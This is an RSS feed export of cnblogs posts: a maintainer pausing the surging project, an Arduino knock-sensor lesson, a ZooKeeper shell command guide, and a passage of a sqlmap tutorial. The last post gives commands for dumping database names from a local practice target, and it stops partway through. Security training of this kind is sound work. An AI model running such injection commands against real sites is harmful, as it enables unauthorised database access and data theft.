<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>暂停研发surging，是否继续维护！ - fanly11</title>
<link>http://www.cnblogs.com/fanliang11/p/11367347.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fanliang11/p/11367347.html</guid>
<description>&lt;h2&gt;&lt;span&gt;&lt;span&gt;前言&lt;/span&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;surging从2017 年开始，2 年来利用业余时间为 surging语言添砖加瓦。 这种活雷锋行为并没有得到开发者们的理解，很多人甚至用命令的口吻,灵魂拷问方式要求活雷锋们再苦再累也得免费为自己劳动或者是回答他的问题&lt;/p&gt;
&lt;p&gt;很多人会命令开源项目维护者赶紧修复这个或那个 bug、逼迫维护者们要满足自己不合理的功能请求、甚至是不动脑，碰到一点问题就灵魂拷问，稍有不顺就要对开源项目维护者们进行人身攻击。要求别人为自己免费劳动，就是在剥夺别人的时间，就是谋财害命啊。本人决定休息二个月，考虑是否继续维护surging.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;暂停维护&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2019年9月1日，我决定暂时中止对 surging社区的维护工作，从2017年6月研发surging以来，我几乎将所有的精力都用在了维护 surging开源项目上，即使是节假日，我也会进行研发维护surging工作。到目前为止持续2年了，这对我来说是一次重大的突破。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;为什么我要暂停研发surging？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这两年的默默无闻的付出和忍受是种浪费。社区用户毫无时间概念的向我提出工作要求，或者灵魂拷问去寻问作者，没有花时间去研究代码熟知原理，只因我一直自愿加班为他们解决问题而且不求回报。久而久之，他们认为这是理所当然的，我就应该及时解决他们反馈的任何问题。开源造就了大多数人希望我在业余时间能够帮助他们，实际上就是找一些理由让我处理与surging专业相关的问题。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;这两个月的思考：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我一开始认为开源就是对一个项目共同协作，然后相互分担维护的工作，&lt;/p&gt;
&lt;p&gt;如果有人向我提出来了不合理的需求，我没有义务必须对他进行回应，因为他不是我的雇主；&lt;/p&gt;
&lt;p&gt;2.0发布之后我会暂时停止surging 维护工作，一个人实在是太累了！&lt;/p&gt;
</description>
<pubDate>Fri, 16 Aug 2019 23:50:00 +0000</pubDate>
<dc:creator>fanly11</dc:creator>
<og:description>前言 surging从2017 年开始，2 年来利用业余时间为 surging语言添砖加瓦。 这种活雷锋行为并没有得到开发者们的理解，很多人甚至用命令的口吻,灵魂拷问方式要求活雷锋们再苦再累也得免费为</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/fanliang11/p/11367347.html</dc:identifier>
</item>
<item>
<title>「雕爷学编程」Arduino动手做（10）——敲击传感器模块 - 行者花雕</title>
<link>http://www.cnblogs.com/eagler8/p/11367341.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/eagler8/p/11367341.html</guid>
<description>&lt;p&gt;37款传感器和模块的提法，在网络上广泛流传，其实Arduino能够兼容的传感器模块肯定是不止37种的。鉴于本人手头积累了一些传感器与模块，依照实践出真知（动手试试）的理念，以学习和交流为目的，这里准备逐一做做实验，不管能否成功，都会记录下来---小小的进步或是搞不定的问题，希望能够抛砖引玉。&lt;/p&gt;


&lt;p&gt;有机玻璃外壳的敲击头和振动开关类似，只是能感受较小振幅的振动，更灵敏一些，余振的时间能维持稍微久一点点。这个模块简单些，相关资料非常少。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817065204806-1937984661.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817065215874-1220577292.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;模块参数&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1、工作电压：3.3V-5V（DC）&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2、模块接口：3PIN&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3、输出信号：数字开关信号&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817070218859-1670583032.jpg&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817070230228-309693181.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;模块接线&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1、GND  接电源负极（板示-）&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2、VCC  接电源正极3.3-5V&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3、DO   TTL开关信号输出（板示S）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071013514-307969001.jpg&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071023634-6518708.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071358907-2037395244.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071409994-1399455309.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071418772-124038458.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071426451-1547455087.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;实验仿真示意图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817071812062-2015726590.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;实验示意图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817072325058-2001058583.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;实验说明&lt;/span&gt;&lt;br/&gt;&lt;span&gt;敲击传感器模块和数字13 接口自带LED 搭建简单电路，制作敲击闪光器。利用数字13 接口自带的LED，将敲击传感器接入数字3接口，当敲击传感器感测到有敲击信号时，LED 闪烁发光。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817072751973-357067497.jpg&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;38&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
/*

【雕爷学编程】Arduino动手做（10）

【Arduino】66种传感器模块系列实验之十：敲击传感器模块

  实验源代码

*/



void setup()

{

    pinMode(3,INPUT);

    pinMode(13,OUTPUT);

}

void loop() {

  if (digitalRead(3)) {

    digitalWrite(13, HIGH);

  }

  else {

    digitalWrite(13, LOW);

  }

}                  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1336105/201908/1336105-20190817073747788-621597534.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 16 Aug 2019 23:38:00 +0000</pubDate>
<dc:creator>行者花雕</dc:creator>
<og:description>雕爷学编程,Arduino动手做,开源硬件,创客传感器, 敲击检测模块</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/eagler8/p/11367341.html</dc:identifier>
</item>
<item>
<title>ZooKeeper系列（三）—— Zookeeper 常用 Shell 命令 - 黑白影</title>
<link>http://www.cnblogs.com/heibaiying/p/11367322.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/heibaiying/p/11367322.html</guid>
<description>&lt;h2 id=&quot;一节点增删改查&quot;&gt;一、节点增删改查&lt;/h2&gt;
&lt;h3 id=&quot;启动服务和连接服务&quot;&gt;1.1 启动服务和连接服务&lt;/h3&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;# 启动服务
bin/zkServer.sh start

#连接服务 不指定服务地址则默认连接到localhost:2181
zkCli.sh -server hadoop001:2181&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;help命令&quot;&gt;1.2 help命令&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;help&lt;/code&gt; 可以查看所有命令及格式。&lt;/p&gt;
&lt;h3 id=&quot;查看节点列表&quot;&gt;1.3 查看节点列表&lt;/h3&gt;
&lt;p&gt;查看节点列表有 &lt;code&gt;ls path&lt;/code&gt; 和 &lt;code&gt;ls2 path&lt;/code&gt; 两个命令，后者是前者的增强，不仅可以查看指定路径下的所有节点，还可以查看当前节点的信息。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 0] ls /
[cluster, controller_epoch, brokers, storm, zookeeper, admin,  ...]
[zk: localhost:2181(CONNECTED) 1] ls2 /
[cluster, controller_epoch, brokers, storm, zookeeper, admin, ....]
cZxid = 0x0
ctime = Thu Jan 01 08:00:00 CST 1970
mZxid = 0x0
mtime = Thu Jan 01 08:00:00 CST 1970
pZxid = 0x130
cversion = 19
dataVersion = 0
aclVersion = 0
ephemeralOwner = 0x0
dataLength = 0
numChildren = 11&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;新增节点&quot;&gt;1.4 新增节点&lt;/h3&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;create [-s] [-e] path data acl   #其中-s 为有序节点，-e 临时节点&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建节点并写入数据：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;create /hadoop 123456&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建有序节点，此时创建的节点名为指定节点名 + 自增序号：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 23] create -s /a  &quot;aaa&quot;
Created /a0000000022
[zk: localhost:2181(CONNECTED) 24] create -s /b  &quot;bbb&quot;
Created /b0000000023
[zk: localhost:2181(CONNECTED) 25] create -s /c  &quot;ccc&quot;
Created /c0000000024&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建临时节点，临时节点会在会话过期后被删除：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 26] create -e /tmp  &quot;tmp&quot;
Created /tmp&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;查看节点&quot;&gt;1.5 查看节点&lt;/h3&gt;
&lt;h4 id=&quot;获取节点数据&quot;&gt;1. 获取节点数据&lt;/h4&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;# 格式
get path [watch] &lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 31] get /hadoop
123456   #节点数据
cZxid = 0x14b
ctime = Fri May 24 17:03:06 CST 2019
mZxid = 0x14b
mtime = Fri May 24 17:03:06 CST 2019
pZxid = 0x14b
cversion = 0
dataVersion = 0
aclVersion = 0
ephemeralOwner = 0x0
dataLength = 6
numChildren = 0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;节点各个属性如下表。其中一个重要的概念是 Zxid(ZooKeeper Transaction Id)，ZooKeeper 节点的每一次更改都具有唯一的 Zxid，如果 Zxid1 小于 Zxid2，则 Zxid1 的更改发生在 Zxid2 更改之前。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;9.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;cZxid&lt;/td&gt;
&lt;td&gt;数据节点创建时的事务 ID&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ctime&lt;/td&gt;
&lt;td&gt;数据节点创建时的时间&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;mZxid&lt;/td&gt;
&lt;td&gt;数据节点最后一次更新时的事务 ID&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;mtime&lt;/td&gt;
&lt;td&gt;数据节点最后一次更新时的时间&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;pZxid&lt;/td&gt;
&lt;td&gt;数据节点的子节点最后一次被修改时的事务 ID&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;cversion&lt;/td&gt;
&lt;td&gt;子节点的更改次数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;dataVersion&lt;/td&gt;
&lt;td&gt;节点数据的更改次数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;aclVersion&lt;/td&gt;
&lt;td&gt;节点的 ACL 的更改次数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;ephemeralOwner&lt;/td&gt;
&lt;td&gt;如果节点是临时节点，则表示创建该节点的会话的 SessionID；如果节点是持久节点，则该属性值为 0&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;dataLength&lt;/td&gt;
&lt;td&gt;数据内容的长度&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;numChildren&lt;/td&gt;
&lt;td&gt;数据节点当前的子节点个数&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4 id=&quot;查看节点状态&quot;&gt;2. 查看节点状态&lt;/h4&gt;
&lt;p&gt;可以使用 &lt;code&gt;stat&lt;/code&gt; 命令查看节点状态，它的返回值和 &lt;code&gt;get&lt;/code&gt; 命令类似，但不会返回节点数据。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 32] stat /hadoop
cZxid = 0x14b
ctime = Fri May 24 17:03:06 CST 2019
mZxid = 0x14b
mtime = Fri May 24 17:03:06 CST 2019
pZxid = 0x14b
cversion = 0
dataVersion = 0
aclVersion = 0
ephemeralOwner = 0x0
dataLength = 6
numChildren = 0&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;更新节点&quot;&gt;1.6 更新节点&lt;/h3&gt;
&lt;p&gt;更新节点的命令是 &lt;code&gt;set&lt;/code&gt;，可以直接进行修改，如下：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 33] set /hadoop 345
cZxid = 0x14b
ctime = Fri May 24 17:03:06 CST 2019
mZxid = 0x14c
mtime = Fri May 24 17:13:05 CST 2019
pZxid = 0x14b
cversion = 0
dataVersion = 1  # 注意更改后此时版本号为 1，默认创建时为 0
aclVersion = 0
ephemeralOwner = 0x0
dataLength = 3
numChildren = 0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也可以基于版本号进行更改，此时类似于乐观锁机制，当你传入的数据版本号 (dataVersion) 和当前节点的数据版本号不符合时，zookeeper 会拒绝本次修改：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 34] set /hadoop 678 0
version No is not valid : /hadoop    #无效的版本号&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;删除节点&quot;&gt;1.7 删除节点&lt;/h3&gt;
&lt;p&gt;删除节点的语法如下：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;delete path [version]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;和更新节点数据一样，也可以传入版本号，当你传入的数据版本号 (dataVersion) 和当前节点的数据版本号不符合时，zookeeper 不会执行删除操作。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 36] delete /hadoop 0
version No is not valid : /hadoop   #无效的版本号
[zk: localhost:2181(CONNECTED) 37] delete /hadoop 1
[zk: localhost:2181(CONNECTED) 38]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要想删除某个节点及其所有后代节点，可以使用递归删除，命令为 &lt;code&gt;rmr path&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;二监听器&quot;&gt;二、监听器&lt;/h2&gt;
&lt;h3 id=&quot;get-path-watch&quot;&gt;2.1 get path [watch]&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;get path [watch]&lt;/code&gt; 注册的监听器能够在节点内容发生改变的时候，向客户端发出通知。需要注意的是 zookeeper 的触发器是一次性的 (One-time trigger)，即触发一次后就会立即失效。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 4] get /hadoop  watch
[zk: localhost:2181(CONNECTED) 5] set /hadoop 45678
WATCHER::
WatchedEvent state:SyncConnected type:NodeDataChanged path:/hadoop  #节点值改变&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;stat-path-watch&quot;&gt;2.2 stat path [watch]&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;stat path [watch]&lt;/code&gt; 注册的监听器能够在节点状态发生改变的时候，向客户端发出通知。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 7] stat /hadoop watch
[zk: localhost:2181(CONNECTED) 8] set /hadoop 112233
WATCHER::
WatchedEvent state:SyncConnected type:NodeDataChanged path:/hadoop  #节点值改变&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;lsls2-path-watch&quot;&gt;2.3 ls\ls2 path [watch]&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;ls path [watch]&lt;/code&gt; 或 &lt;code&gt;ls2 path [watch]&lt;/code&gt; 注册的监听器能够监听该节点下所有&lt;strong&gt;子节点&lt;/strong&gt;的增加和删除操作。&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[zk: localhost:2181(CONNECTED) 9] ls /hadoop watch
[]
[zk: localhost:2181(CONNECTED) 10] create  /hadoop/yarn &quot;aaa&quot;
WATCHER::
WatchedEvent state:SyncConnected type:NodeChildrenChanged path:/hadoop&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;三-zookeeper-四字命令&quot;&gt;三、 zookeeper 四字命令&lt;/h2&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;10&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;conf&lt;/td&gt;
&lt;td&gt;打印服务配置的详细信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;cons&lt;/td&gt;
&lt;td&gt;列出连接到此服务器的所有客户端的完整连接/会话详细信息。包括接收/发送的数据包数量，会话 ID，操作延迟，上次执行的操作等信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;dump&lt;/td&gt;
&lt;td&gt;列出未完成的会话和临时节点。这只适用于 Leader 节点。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;envi&lt;/td&gt;
&lt;td&gt;打印服务环境的详细信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;ruok&lt;/td&gt;
&lt;td&gt;测试服务是否处于正确状态。如果正确则返回“imok”，否则不做任何相应。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;stat&lt;/td&gt;
&lt;td&gt;列出服务器和连接客户端的简要详细信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;wchs&lt;/td&gt;
&lt;td&gt;列出所有 watch 的简单信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;wchc&lt;/td&gt;
&lt;td&gt;按会话列出服务器 watch 的详细信息。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;wchp&lt;/td&gt;
&lt;td&gt;按路径列出服务器 watch 的详细信息。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;更多四字命令可以参阅官方文档：https://zookeeper.apache.org/doc/current/zookeeperAdmin.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用前需要使用 &lt;code&gt;yum install nc&lt;/code&gt; 安装 nc 命令，使用示例如下：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;[root@hadoop001 bin]# echo stat | nc localhost 2181
Zookeeper version: 3.4.13-2d71af4dbe22557fda74f9a9b4309b15a7487f03, 
built on 06/29/2018 04:05 GMT
Clients:
 /0:0:0:0:0:0:0:1:50584[1](queued=0,recved=371,sent=371)
 /0:0:0:0:0:0:0:1:50656[0](queued=0,recved=1,sent=0)
Latency min/avg/max: 0/0/19
Received: 372
Sent: 371
Connections: 2
Outstanding: 0
Zxid: 0x150
Mode: standalone
Node count: 167&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;3.75&quot;&gt;
&lt;p&gt;&lt;strong&gt;更多大数据系列文章可以参见 GitHub 开源项目&lt;/strong&gt;： &lt;a href=&quot;https://github.com/heibaiying/BigData-Notes&quot;&gt;&lt;strong&gt;大数据入门指南&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Fri, 16 Aug 2019 23:03:00 +0000</pubDate>
<dc:creator>黑白影</dc:creator>
<og:description>一、节点增删改查 1.1 启动服务和连接服务 1.2 help命令 使用 可以查看所有命令及格式。 1.3 查看节点列表 查看节点列表有 和 两个命令，后者是前者的增强，不仅可以查看指定路径下的所有节</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/heibaiying/p/11367322.html</dc:identifier>
</item>
<item>
<title>安全测试基础2-sqlmap演练 - 飞天小子</title>
<link>http://www.cnblogs.com/Zfc-Cjk/p/11367279.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Zfc-Cjk/p/11367279.html</guid>
<description>&lt;h2&gt;sqlmap简介&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的安全漏洞检测。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它支持五种不同的注入模式：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
基于布尔的盲注，即可以根据返回页面判断条件真假的注入；

基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；

基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；

联合查询注入，可以使用union的情况下的注入；

堆查询注入，可以同时执行多条语句的执行时的注入。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;sqlmap的安装方式很简单。只需要在python2.7的环境下执行&lt;/span&gt; &lt;span&gt;&lt;strong&gt;&lt;span&gt;pip install sqlmap&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;即可，开袋即食。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;靶机演示&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;接着上一篇 &lt;span&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cnblogs.com/Zfc-Cjk/p/8460101.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;sql手工注入&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;https://www.cnblogs.com/Zfc-Cjk/p/8460101.html&quot; target=&quot;_blank&quot;&gt; &lt;/a&gt; &lt;span&gt;我们来做一个sqlmap演示&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817060531567-442686313.png&quot; alt=&quot;&quot; width=&quot;700&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最简单粗暴的方式，我们直接敲命令爆库。可以暴露出当前系统下所有的数据库名称&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
sqlmap -u &quot;http://192.168.1.3/webug/pentest/test/sqli/sqltamp.php?gid=1&quot; --batch --dbs
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817060724636-1236264292.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;或者我们的吃相不希望那么难看，只想要当前sql下对应的数据库名称&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
sqlmap -u &quot;http://192.168.1.3/webug/pentest/test/sqli/sqltamp.php?gid=1&quot; -p gid --current-db
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817061216950-1409903674.png&quot; alt=&quot;&quot; width=&quot;700&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;接着我们来爆表名。暴露出 &lt;strong&gt;&lt;span&gt;pentesterlab&lt;/span&gt;&lt;/strong&gt; &lt;span&gt;数据下的四张表。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
